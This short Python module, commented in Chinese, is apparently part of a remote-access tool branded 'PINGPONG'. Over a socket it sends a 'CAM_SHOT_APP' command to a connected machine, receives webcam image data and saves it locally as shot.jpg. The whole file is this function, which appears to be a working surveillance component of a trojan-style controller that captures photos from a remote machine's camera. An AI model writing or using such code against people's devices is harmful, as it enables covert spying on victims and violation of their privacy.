# # 调用摄像头拍摄照片
import os
import shutil
import time
import sys
import traceback
sys.path.append("..")
from main import print_good, print_normal
#拍照功能
def cam_shot(sendobj, conn):
    print_normal("PINGPONG>[*]Starting......")
    sendobj.App_send("CAM_SHOT_APP", False, conn)
    len_data = conn.recv(1024)
    conn.send(bytes("OK", 'utf8'))
    print_normal("PINGPONG>[*]Getting Frame......")
    int_len = int(len_data.decode('utf8'))
    img_data = conn.recv(int_len)
    conn.send(bytes("OK", "utf8"))
    with open("shot.jpg", "wb+") as f:
        f.write(img_data)
    print_good("PINGPONG>[+]Shot successfully, image file save as shot.jpg")